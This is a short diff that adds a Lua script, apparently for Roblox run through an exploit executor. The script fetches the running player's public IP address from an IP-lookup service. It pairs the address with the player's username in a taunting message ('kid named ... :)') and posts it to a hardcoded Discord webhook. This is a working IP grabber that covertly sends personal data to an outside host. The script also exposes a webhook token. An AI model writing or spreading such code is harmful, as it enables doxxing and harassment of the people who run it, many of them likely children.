@@ -1,0 +1,5 @@
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local msg = "kid named " .. game.Players.LocalPlayer.Name .. " - " .. ip .. " :)"
+local url = "https://discord.com/api/webhooks/1017946396533473351/lh7DFgD4b-5TIHTv1GRjECQ2GzxxnSjOnokWH9vFdMVJ7a6lpsuUXocJ-jfMEO2SnTz2"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
